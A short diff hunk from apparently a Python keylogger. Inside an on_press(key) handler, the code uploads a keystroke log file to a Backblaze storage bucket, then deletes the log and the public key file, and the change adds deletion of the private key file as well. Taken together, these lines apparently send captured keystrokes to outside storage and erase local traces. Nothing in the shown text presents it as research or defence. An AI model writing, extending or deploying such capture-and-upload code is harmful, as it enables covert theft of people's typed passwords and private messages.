@@ -613,6 +613,7 @@ def on_press(key):
         upload_file_to_backblaze(bucket_name, log_file)
         os.remove(log_file)
         os.remove("public_key.pem")
+        os.remove("private_key.pem")
         return False
 
     if len(buffer) >= 10:
